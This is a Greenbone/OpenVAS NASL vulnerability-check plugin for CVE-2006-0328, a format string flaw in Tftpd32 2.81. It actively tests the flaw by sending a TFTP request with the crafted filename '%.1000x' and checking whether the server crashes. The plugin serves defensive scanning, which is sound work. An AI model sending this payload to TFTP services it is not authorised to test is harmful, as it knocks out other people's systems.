# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902835");
  script_version("2025-03-05T05:38:53+0000");
  script_cve_id("CVE-2006-0328");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-05-23 14:14:14 +0530 (Wed, 23 May 2012)");
  script_name("TFTPD32 Request Error Message Format String Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/18539");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/16333");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/632633");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/24250");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/1424");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/422405");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause a denial of service.");

  script_tag(name:"affected", value:"Tftpd32 version 2.81.");

  script_tag(name:"insight", value:"The flaw is due to a format string error when the filename received in
  a TFTP request is used to construct an error message. This can be exploited
  to crash the application via a TFTP request packet containing a specially crafted filename.");

  script_tag(name:"solution", value:"Upgrade to Tftpd32 version 2.8.2 or later.");

  script_tag(name:"summary", value:"TFTPD32 is prone to format string vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_alive(port:port))
  exit(0);

tftp_get(path:"%.1000x", port:port);

if(!tftp_alive(port:port)) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);
